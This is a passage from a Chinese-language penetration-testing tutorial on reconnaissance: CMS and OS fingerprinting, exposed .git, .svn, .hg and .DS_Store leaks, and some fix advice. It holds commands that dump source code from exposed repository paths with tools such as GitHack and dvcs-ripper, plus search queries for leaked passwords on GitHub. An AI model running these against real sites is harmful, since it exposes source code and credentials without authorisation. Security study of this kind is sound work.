requirements.txt</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">python3 cmseek.py</span><br><span class="line"></span><br><span class="line">如果提示没有安装，选择y，进行安装</span><br><span class="line"></span><br><span class="line">选择1，进行cms基本检测，结果会自动保存</span><br><span class="line"></span><br><span class="line">选择2，多个域名扫描，用“,”隔开</span><br><span class="line"></span><br><span class="line">结果会保存在/Result/&#123;域名&#125;/*.json文件内</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">  python3 cmseek.py -u example.com          </span><br><span class="line">      # 直接扫描</span><br><span class="line">          </span><br><span class="line">      python3 cmseek.py -l /home/user/target.txt    </span><br><span class="line">      #扫描target.txt中指定的站点（逗号分隔） </span><br><span class="line">      </span><br><span class="line">      python3 cmseek.py -u example.com --user-agent Mozilla 5.0  </span><br><span class="line">      #使用自定义user-Agent扫描example.com这里使用的是Mozilla 5.0</span><br><span class="line">          </span><br><span class="line">      python3 cmseek.py -u example.com --random-agent            </span><br><span class="line">      # 使用随机用户代理扫描 example.com</span><br><span class="line">      </span><br><span class="line">      python3 cmseek.py -v -u example.com                        </span><br><span class="line">      # 在扫描 example.com 时启用详细输出</span><br></pre></td></tr></table></figure><h4 id="whatcms"><a class="markdownIt-Anchor" href="#whatcms">#</a> whatcms</h4><p>kali 自带</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628065865633-17b42e51-59bc-4aff-a352-a235abfffca2.png" alt="img"></p><h3 id="chrome插件"><a class="markdownIt-Anchor" href="#chrome插件">#</a> chrome 插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wappalyzer：https://www.wappalyzer.com</span><br><span class="line">whatruns：https://www.whatruns.com/</span><br></pre></td></tr></table></figure><h3 id="人工识别"><a class="markdownIt-Anchor" href="#人工识别">#</a> 人工识别</h3><ul><li>引擎 &amp; 前端源码配合识别</li><li>显示页面 &amp; 框架不同来判断</li></ul><p>识别目标：</p><ul><li><ul><li>开发语言</li><li>开发框架</li></ul></li><li><ul><li>第三方组件</li><li>CMS 程序</li></ul></li><li><ul><li>数据库</li></ul></li></ul><p>开发语言：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">后缀名识别：asp,php,jsp</span><br><span class="line"></span><br><span class="line">如果无法通过后缀名识别，可以通过抓包查看与后台的交互点，如：登录，查询</span><br><span class="line"></span><br><span class="line">http返回消息头：x-Powered-By</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID--&gt;php  ,   JSPSESSID--&gt;jsp  ,   ASPSESSID--&gt;asp</span><br></pre></td></tr></table></figure><p>开发框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">php的Thinkphp框架识别方法特定的ico：https://www.thinkphp.cn/</span><br><span class="line"></span><br><span class="line">Action后缀 90%机率是struts2或者webwork</span><br><span class="line"></span><br><span class="line">do后缀 50%机率是spring mvc</span><br><span class="line"></span><br><span class="line">url路径 /action/xxx 70%机率是struts2</span><br><span class="line"></span><br><span class="line">form后缀 60%机率是spring mvc</span><br><span class="line"></span><br><span class="line">Vm后缀 90%机率是VelocityViewServlet</span><br><span class="line"></span><br><span class="line">jsf后缀 99%机率是java server faces</span><br><span class="line"></span><br><span class="line">http返回消息头：X-Generator: Swiftlet    很多时候没有显示</span><br></pre></td></tr></table></figure><p>第三方组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般包括流量统计，文件编辑器，模板引擎</span><br></pre></td></tr></table></figure><p>CMS 程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">robots.txt文件识别：（相关厂商下的cms（内容管理系统）程序文件包含说明当前cms名称及版本的特征码）</span><br><span class="line">Disallow: /plus/feedback_js.php</span><br><span class="line">Disallow: /plus/mytag_js.php</span><br><span class="line">Disallow: /plus/rss.php</span><br><span class="line">Disallow: /plus/search.php</span><br><span class="line">Disallow: /plus/recommend.php</span><br><span class="line">Disallow: /plus/stow.php</span><br><span class="line">Disallow: /plus/count.php</span><br><span class="line">看到这个基本可以判断为dedecms</span><br><span class="line">    </span><br><span class="line">网站favicon图标</span><br></pre></td></tr></table></figure><p>数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常规判断：asp--&gt;sql server , php--&gt;mysql , jsp--&gt;oracle</span><br><span class="line"></span><br><span class="line">网站错误信息</span><br><span class="line"></span><br><span class="line">端口服务：1433--&gt;sql server , 3306--&gt;mysql , 1521--&gt;oracle</span><br></pre></td></tr></table></figure><h2 id="源码泄露安全"><a class="markdownIt-Anchor" href="#源码泄露安全">#</a> 源码泄露安全</h2><p>Web 源码泄露的漏洞：</p><ul><li><p>git 源码泄露</p></li><li><p>svn 源码泄露</p></li><li><p>hg 源码泄漏</p></li><li><p>网站备份压缩文件</p></li><li><p>WEB-INF/web.xml 泄露</p></li><li><p>DS_Store 文件泄露</p></li><li><p>SWP 文件泄露</p></li><li><p>CVS 泄露</p></li><li><p>Bzr 泄露</p></li><li><p>GitHub 源码泄漏</p></li></ul><h3 id="git-源码泄露"><a class="markdownIt-Anchor" href="#git-源码泄露">#</a> git 源码泄露</h3><p>Git 是一个开源的分布式版本控制系统，在执行 git init 初始化目录的时候，会在当前目录下自动创建一个.git 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码；</p><h4 id="githack"><a class="markdownIt-Anchor" href="#githack">#</a> GitHack</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL0dpdEhhY2s=">https://github.com/lijiejie/GitHack</span></p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://www.openssl.org/.git/</span><br></pre></td></tr></table></figure><p>修复建议：删除.git 目录或者修改中间件配置进行对.git 隐藏文件夹的访问；</p><h3 id="svn-源码泄露"><a class="markdownIt-Anchor" href="#svn-源码泄露">#</a> SVN 源码泄露</h3><p>SVN 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为.svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到 WEB 服务器上，这就使.svn 隐藏文件夹被暴露于外网环境，可以利用.svn/entries 文件，获取到服务器源码；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FkbWludG9ueS9zdm5FeHBsb2l0">https://github.com/admintony/svnExploit</span></p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/admintony/svnExploit.git</span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">python SvnExploit.py -h</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">检测SVN源代码泄露：</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn</span><br><span class="line"></span><br><span class="line">下载源代码：</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn --dump</span><br></pre></td></tr></table></figure><p>修复建议：删除 web 目录中所有.svn 隐藏文件夹，开发人员在使用 SVN 时，严格使用导出功能，禁止直接复制代码</p><h3 id="hg源码泄漏"><a class="markdownIt-Anchor" href="#hg源码泄漏">#</a> hg 源码泄漏</h3><p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init 的时候会生成.hg；</p><h4 id="dvcs-ripper"><a class="markdownIt-Anchor" href="#dvcs-ripper">#</a> dvcs-ripper</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tvc3QvZHZjcy1yaXBwZXI=">https://github.com/kost/dvcs-ripper</span></p><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://www.example.com/.hg/</span><br><span class="line"></span><br><span class="line">//忽略 SSL 认证验证（使用 -s）:</span><br><span class="line">rip-hg.pl -s -v -u http://www.example.com/.hg/</span><br></pre></td></tr></table></figure><h3 id="cvs泄露"><a class="markdownIt-Anchor" href="#cvs泄露">#</a> CVS 泄露</h3><p>CVS 是一个 C/S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root 以及 CVS/Entries 目录，直接就可以看到泄露的信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure><p>工具同上：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用：</span><br><span class="line">rip-cvs.pl -v -u http://www.example.com/CVS/</span><br></pre></td></tr></table></figure><h3 id="bazaarbzr泄露"><a class="markdownIt-Anchor" href="#bazaarbzr泄露">#</a> Bazaar/bzr 泄露</h3><p>bzr 也是个版本控制工具，虽然不是很热门，但它也是多平台支持，并且有不错的图形界面；</p><p>工具同上：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure><h3 id="网站备份压缩文件"><a class="markdownIt-Anchor" href="#网站备份压缩文件">#</a> 网站备份压缩文件</h3><p>管理员将网站源代码备份在 Web 目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露；</p><p>常见的备份文件后缀：</p><ul><li><p>.rar</p></li><li><p>.zip</p></li><li><p>.7z</p></li><li><p>.tar.gz</p></li><li><p>.bak</p></li><li><p>.txt</p></li><li><p>.old</p></li><li><p>.temp</p></li></ul><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zvcnl1amlhbg==">https://github.com/foryujian</span></p><h3 id="web-infwebxml-泄露"><a class="markdownIt-Anchor" href="#web-infwebxml-泄露">#</a> WEB-INF/web.xml 泄露</h3><p>WEB-INF 是 Java 的 WEB 应用的安全目录，如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF 主要包含一下文件或目录：</span><br><span class="line"></span><br><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure><p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码；</p><h3 id="ds_store-文件泄露"><a class="markdownIt-Anchor" href="#ds_store-文件泄露">#</a> DS_Store 文件泄露</h3><p>.DS_Store 是 Mac 下 Finder 用来保存如何展示 文件 / 文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件；</p><h4 id="ds_store_exp"><a class="markdownIt-Anchor" href="#ds_store_exp">#</a> ds_store_exp</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL2RzX3N0b3JlX2V4cA==">https://github.com/lijiejie/ds_store_exp</span></p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lijiejie/ds_store_exp.git</span><br><span class="line">cd ds_store_exp</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure><h3 id="swp-文件泄露"><a class="markdownIt-Anchor" href="#swp-文件泄露">#</a> SWP 文件泄露</h3><p>swp 即 swap 文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件</span><br></pre></td></tr></table></figure><h3 id="github源码泄露"><a class="markdownIt-Anchor" href="#github源码泄露">#</a> github 源码泄露</h3><p>GitHub 是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码；</p><p>类似的代码托管平台还有很多，人才是最大的漏洞；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=smtp+user+@qq.com&amp;type=code</span><br></pre></td></tr></table></figure><h4 id="dumpall"><a class="markdownIt-Anchor" href="#dumpall">#</a> dumpall</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4SEpLL2R1bXBhbGw=">https://github.com/0xHJK/dumpall</span></p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#手动下载使用</span><br><span class="line">git clone https://github.com/0xHJK/dumpall</span><br><span class="line"></span><br><span class="line">#查看版本</span><br><span class="line">python3 dumpall.py --version</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#下载文件（源代码） </span><br><span class="line">dumpall -u &lt; url &gt; [-o &lt; outdir &gt; ] #示例</span><br><span class="line">dumpall -u http://example.com/.git/</span><br><span class="line">dumpall -u http://example.com/.svn/</span><br><span class="line">dumpall -u http://example.com/.DS_Store</span><br><span class="line">dumpall -u http://example.com/</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  --version 显示版本并退出。</span><br><span class="line">  -u, --url TEXT 指定目标URL，支持.git/.svn/.DS_Store，以及页面索引</span><br><span class="line">  -o, --outdir TEXT 指定保存目录，默认目录命名主机名</span><br><span class="line">  --help 显示此消息并退出。</span><br></pre></td></tr></table></figure><h1 id="搭建"><a class="markdownIt-Anchor" href="#搭建">#</a> 搭建</h1><h2 id="系统"><a class="markdownIt-Anchor" href="#系统">#</a> 系统</h2><h3 id="ttl值判断系统"><a class="markdownIt-Anchor" href="#ttl值判断系统">#</a> TTL 值判断系统</h3><p>TTL 值全称是 “生存时间（Time To Live)”，简单的说它表示 DNS 记录在 DNS 服务器上缓存时间；</p><p>TTL 是数据包生存周期，根据减少的数可以判断经过了多少中间设备；</p><p>默认情况下的值：</p><ul><li><ul><li><ul><li><ul><li><ul><li><ul><li>WINDOWS NT/2000   TTL：128</li><li>WINDOWS 95/98 TTL：32</li></ul></li></ul></li></ul></li></ul></li></ul></li><li><ul><li><ul><li><ul><li><ul><li><ul><li>UNIX TTL：255</li><li>LINUX TTL：64</li></ul></li></ul></li></ul></li></ul></li></ul></li><li><ul><li><ul><li><ul><li><ul><li><ul><li>WIN7 TTL：64</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="大小写判断"><a class="markdownIt-Anchor" href="#大小写判断">#</a> 大小写判断</h3><p>Linux 对大小写敏感，windows 对大小写不敏感；</p><p>改变 URL 中的大小写进行判断；</p><h3 id="nmap系统系统指纹识别"><a class="markdownIt-Anchor" href="#nmap系统系统指纹识别">#</a> nmap 系统系统指纹识别</h3><p>原理：</p><p>通过 TCP/IP 数据包发到目标主机，由于每个操作系统类型对于处理 TCP/IP 数据包都不相同，所以可以通过之间的差别判定操作系统类型；</p><p>识别方法一 (-O 参数)：</p><ul><li><ul><li>nmap -sS -Pn -O ip</li></ul></li><li><ul><li><ul><li>nmap 识别操作系统指纹必须使用端口，所以不允许添加 - sn 参数</li></ul></li></ul></li></ul><p>识别方法二 (端口服务识别)：</p><ul><li><ul><li>nmap -sS -sV ip</li></ul></li><li><ul><li><ul><li>每个操作系统都有特定的服务和端口；</li></ul></li></ul></li><li><ul><li><ul><li><ul><li>windows 桌面连接使用的 3389 端口，rdp 协议</li><li>445 端口 windows 的 smb 协议开启端口</li></ul></li></ul></li></ul></li><li><ul><li><ul><li><ul><li>linux 系统远程连接 22 端口，ssh 协议</li></ul></li></ul></li></ul></li></ul><h2 id="中间件"><a class="markdownIt-Anchor" href="#中间件">#</a> 中间件</h2><p>常见的中间件：</p><ul><li><ul><li>Apache</li><li>Nginx</li></ul></li><li><ul><li>IIS</li><li>tomcat</li></ul></li><li><ul><li>jetty</li><li>webloigc</li></ul></li><li><ul><li>JBOSS</li><li>等</li></ul></li></ul><p>判断方法：</p><ul><li><p>http 返回消息中 server 字段</p></li><li><ul><li>F12–&gt;Network 查看</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627460586277-cbe01766-5571-4219-b9c6-fe401b853732.png" alt="img"></p><ul><li>根据报错信息判断</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627461061856-a51cee66-0ef4-42d2-9d91-c7c98439be05.png" alt="img"></p><ul><li>根据默认页面判断</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627461223570-5f872b38-0072-4b5c-843b-8c8848fdeff1.png" alt="img"></p><ul><li><p>通过端口服务探测</p></li><li><ul><li>tomcat，jboss：8080</li><li>weblogin：7001</li></ul></li><li><ul><li>namp -sS -Pn -sV ip</li></ul></li><li><p>curl 命令查询头信息</p></li><li><ul><li>curl <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFpZHUuY29t">https://www.baidu.com</span> -i</li><li>curl <span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb20=">http://www.baidu.com</span> -i &gt;C:/ip.txt</li></ul></li><li><ul><li><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628064199381-3983cd84-9889-4039-8c61-4407d1f0af0d.png" alt="img"></li></ul></li></ul><h2 id="数据库"><a class="markdownIt-Anchor" href="#数据库">#</a> 数据库</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描">#</a> 端口扫描</h3><p>直接扫描全端口；</p><h3 id="默认端口"><a class="markdownIt-Anchor" href="#默认端口">#</a> 默认端口</h3><p>常见数据库默认端口：</p><ul><li><ul><li>Oracle — 1521</li><li>MySQL — 3306</li></ul></li><li><ul><li>SQL Server — 1433</li><li>DB2 — 5000</li></ul></li><li><ul><li>PostgreSQL — 5432</li><li>MongoDB — 27017</li></ul></li><li><ul><li>Redis — 6379</li></ul></li></ul><h1 id="架构"><a class="markdownIt-Anchor" href="#架构">#</a> 架构</h1><h2 id="敏感文件搜索"><a class="markdownIt-Anchor" href="#敏感文件搜索">#</a> 敏感文件搜索</h2><h3 id="github搜索"><a class="markdownIt-Anchor" href="#github搜索">#</a> Github 搜索</h3><ul><li><p>in:name test                #仓库标题搜索含有关键字 test</p></li><li><p>in:descripton test       #仓库描述搜索含有关键字</p></li><li><p>in:readme test            #Readme 文件搜素含有关键字</p></li></ul><p>搜索某些系统的密码</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYXJjaD9xPXNtdHArNTguY29tK3Bhc3N3b3JkKzMzMDYmYW1wO3R5cGU9Q29kZQ==">https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code</span></li><li><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628062611495-a5b181db-8c23-4b2f-91f5-213e61ad6f86.png" alt="img"></li></ul></li></ul><p>github 关键词监控</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY29kZXJjdG8uY29tL2EvNDY2NDAuaHRtbA==">https://www.codercto.com/a/46640.html</span></li></ul></li></ul><h4 id="google搜索"><a class="markdownIt-Anchor" href="#google搜索">#</a> Google 搜索</h4><p>google 配合 github 搜索敏感信息</p><ul><li><p>site:Github.com sa password</p></li><li><p>site:Github.com root password</p></li><li><p>site:Github.com User ID=‘sa’;Password</p></li><li><p>site:Github.com inurl:sql</p></li></ul><h4 id="svn-信息收集"><a class="markdownIt-Anchor" href="#svn-信息收集">#</a> SVN 信息收集</h4><p>google 配合 github 搜索 SVN 敏感信息</p><ul><li><p>site:Github.com svn</p></li><li><p>site:Github.com svn username</p></li><li><p>site:Github.com svn password</p></li><li><p>site:Github.com svn username password</p></li></ul><h4 id="综合信息收集"><a class="markdownIt-Anchor" href="#综合信息收集">#</a> 综合信息收集</h4><ul><li><p>site:Github.com password</p></li><li><p>site:Github.com ftp ftppassword</p></li><li><p>site:Github.com 密码</p></li><li><p>site:Github.com 内部</p></li></ul><h4 id="扩展参考"><a class="markdownIt-Anchor" href="#扩展参考">#</a> 扩展参考</h4><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTkyL2FydGljbGUvZGV0YWlscy85OTY5MDc0Mg==">https://blog.csdn.net/qq_36119192/article/details/99690742</span></p></li><li><p><span class="exturl" data-url="aHR0cDovL3d3dy4zNjF3YXkuY29tL2dpdGh1Yi1oYWNrLzYyODQuaHRtbA==">http://www.361way.com/github-hack/6284.html</span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1vbi1naXRodWIvc2VhcmNoaW5nLWNvZGU=">https://docs.github.com/cn/github/searching-for-information-on-github/searching-on-github/searching-code</span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYXJjaD9xPXNtdHArYmlsaWJpbGkuY29tJmFtcDt0eXBlPWNvZGU=">https://github.com/search?q=smtp+bilibili.com&amp;type=code</span></p></li></ul><h3 id="google-hacking"><a class="markdownIt-Anchor" href="#google-hacking">#</a> Google hacking</h3><p>详情参考前面的黑白引擎使用：</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvYzk5NzQ5ZjctMWMxZC00YWVlLWE0ZTMtYTVmMTllMTlmMmYxPyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUFpb2g4JUVGJUJDJTg5">https://www.yuque.com/docs/share/c99749f7-1c1d-4aee-a4e3-a5f19e19f2f1?#（密码：ioh8）</span> 《黑白引擎使用》</p><h3 id="wooyun漏洞库"><a class="markdownIt-Anchor" href="#wooyun漏洞库">#</a> wooyun 漏洞库</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93b295dW4ud2Vic2l0ZS8=">https://wooyun.website/</span></li></ul><h3 id="网盘搜索"><a class="markdownIt-Anchor" href="#网盘搜索">#</a> 网盘搜索</h3><p>凌云搜索  <span class="exturl" data-url="aHR0cHM6Ly93d3cubGluZ2Zlbmd5dW4uY29tLw==">https://www.lingfengyun.com/</span></p><p>盘搜搜：<span class="exturl" data-url="aHR0cDovL3d3dy5wYW5zb3NvLmNvbS8=">http://www.pansoso.com/</span></p><p>盘搜：<span class="exturl" data-url="aHR0cDovL3d3dy5wYW5zb3UuY29tLw==">http://www.pansou.com/</span></p><h3 id="js敏感信息"><a class="markdownIt-Anchor" href="#js敏感信息">#</a> js 敏感信息</h3><p>网站的 url 连接写到 js 里面；</p><p>js 的 api 接口里面包含用户信息比如账号和密码；</p><h4 id="jsfinder"><a class="markdownIt-Anchor" href="#jsfinder">#</a> jsfinder</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20va24xZmVzL0pTRmluZGVy">https://gitee.com/kn1fes/JSFinder</span></p><h4 id="packer-fuzzer"><a class="markdownIt-Anchor" href="#packer-fuzzer">#</a> Packer-Fuzzer</h4><p>寻找网站交互接口授权 key；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20va2V5Ym94ZHpkL1BhY2tlci1GdXp6ZXI=">https://gitee.com/keyboxdzd/Packer-Fuzzer</span></p><p>安装使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs &amp;&amp; sudo apt-get install npm</span><br><span class="line"></span><br><span class="line">git clone https://gitee.com/keyboxdzd/Packer-Fuzzer.git</span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">python3 PackerFuzzer.py -u https://www.liaoxuefeng.com </span><br><span class="line"></span><br><span class="line">在repoets文件内查看结果，一个docx格式，一个html格式</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628065367424-f688a610-7851-4437-b80a-544df9989d1e.png" alt="img"></p><h4 id="secretfinder"><a class="markdownIt-Anchor" href="#secretfinder">#</a> SecretFinder</h4><p>一款基于 Python 脚本的 JavaScript 敏感信息搜索工具；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vbXVjbi9TZWNyZXRGaW5kZXI=">https://gitee.com/mucn/SecretFinder</span></p><h2 id="端口类站点"><a class="markdownIt-Anchor" href="#端口类站点">#</a> 端口类站点</h2><h3 id="默认端口-2"><a class="markdownIt-Anchor" href="#默认端口-2">#</a> 默认端口</h3><h4 id="web应用服务端口"><a class="markdownIt-Anchor" href="#web应用服务端口">#</a> web 应用服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">80/443/8080---&gt; 常见web端口</span><br><span class="line">7001/7002--&gt; Weblogic控制台</span><br><span class="line">8080--&gt; Jboss/Resin/Jetty/Jenkins</span><br><span class="line">9090--&gt; WebSphere控制台</span><br><span class="line">4848--&gt; GlassFish控制台</span><br><span class="line">1352--&gt; Lotus domino控制台</span><br><span class="line">10000--&gt; Webmin-Web控制面板</span><br></pre></td></tr></table></figure><h4 id="文件共享服务端口"><a class="markdownIt-Anchor" href="#文件共享服务端口">#</a> 文件共享服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">21--&gt; Ftp文件传输协议</span><br><span class="line">69--&gt; 